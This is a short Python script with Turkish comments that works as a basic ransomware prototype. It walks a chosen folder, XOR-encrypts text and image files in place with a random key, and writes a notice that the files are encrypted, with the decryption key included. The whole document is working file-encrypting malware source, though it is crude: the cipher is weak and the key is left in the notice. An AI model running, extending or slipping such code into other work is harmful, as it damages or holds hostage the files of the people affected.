import os
import random
import string

def crypted():
    
    srcPath = r'şifrelencek klasörün yolu \  kullanın  örnek C\user\örnek'
    bilgilendirmePath=r"buraya şifrelendikden sonra çözme anahtarı yazdıralacak txt dosyasının yolunu girin \ kullanın  örnek C\user\örnek"

    #uzantılar
    ext_list = ['.txt','png','jpg','jfif']
  
    key = ''.join(random.choice(string.ascii_letters) for x in range(32))
   
    for root, dirs, files in os.walk(srcPath):
        for file in files:
            if file.endswith(tuple(ext_list)):
               
                file_path = os.path.join(root, file)
               
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = xor(data, key)
              
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
    # Şifrelenmiş dosyaların açıklama metnini yazdır
    with open(bilgilendirmePath, 'w') as f:
        f.write("Dosyalarınız şifrelendi.")
        f.write("Şifre Çözme Anahtarı: " + key)
        print("Şifre Çözme Anahtarı: " + key)

def xor(data, key):
    xored = b''
    for i in range(len(data)):
        xored += bytes([data[i] ^ ord(key[i % len(key)])])
    return xored


if __name__ == '__main__':
    crypted()